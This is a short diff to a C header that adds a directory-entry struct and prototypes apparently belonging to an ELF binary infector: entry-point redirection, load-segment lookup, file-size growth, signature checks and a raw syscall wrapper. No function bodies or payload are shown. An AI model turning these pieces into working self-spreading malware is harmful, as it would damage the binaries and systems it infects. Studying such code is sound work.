@@ -99,6 +99,13 @@ struct stat {
     unsigned char osef[92];
 };
 
+struct linux_dirent64 {
+    unsigned long  d_ino;
+    unsigned long  d_off;
+    unsigned short d_reclen;
+    char           d_name[];
+};
+
 unsigned long int ft_syscall(void *arg1, void *arg2, void *arg3, void *arg4, void *arg5);
 int ft_strcat(char *dst, char *src);
 unsigned long int	ft_strlen(const char *str);
@@ -107,7 +114,7 @@ int memncat(void *src, unsigned long int index, void *dst, unsigned long int n);
 void	*ft_memset(void *s, int c, unsigned long int n);
 int check_file(struct ELFheaders64 fHdr);
 int checkSignature(int fd, const char *signature);
-unsigned char isDir(const char *path);
+unsigned char isDir(char *path);
 int find_offset_nentry_oentry(unsigned long int oep, unsigned long int nep);
 int get_section_index(int flags, unsigned int type, struct ELFheaders64 fHdr, struct sheaders64 *sHdrs);
 
@@ -118,6 +125,6 @@ int    findLastLoadSection(struct sheaders64 *sHdrs, struct ELFheaders64 fHdr, s
 int get_last_load_segment(struct pheaders64 *pHdrs, struct ELFheaders64 fHdr);
 unsigned char increaseFileSize(int fd, struct ELFheaders64 fHdr, struct sheaders64 *sHdrs);
 
-// void ft_print_hexa_raw(unsigned char *buf, size_t len);
+int _start();
 
 #endif
